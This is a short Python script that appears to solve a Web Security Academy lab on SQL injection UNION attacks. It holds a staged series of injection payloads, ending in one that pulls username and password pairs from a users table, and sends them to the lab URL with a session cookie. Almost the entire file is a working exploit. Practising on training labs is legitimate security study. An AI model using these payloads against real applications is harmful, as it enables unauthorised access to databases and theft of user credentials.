#!/usr/bin/env python3

import urllib.parse
import requests

#SQL injection UNION attack, retrieving multiple values in a single column

link = "https://ac421fa31f6c082bc0537cb20029006a.web-security-academy.net/filter?category=Gifts"
#chunk = "' UNION SELECT NULL,NULL--" # number of columns
#chunk = "' UNION SELECT NULL,version()--" # database version
#chunk = "' UNION SELECT NULL,'abc'--" # column containing text
chunk = "' UNION SELECT NULL,username||'~'||password FROM users--" # payload
url = link + urllib.parse.quote(chunk)

payload={}
headers = {
  'Cookie': 'session=NucUMs9URdJxUu1cKfiRfMXXdLgGPrr1'
}

response = requests.request("GET", url, headers=headers, data=payload)

print(url)
print(response.status_code)
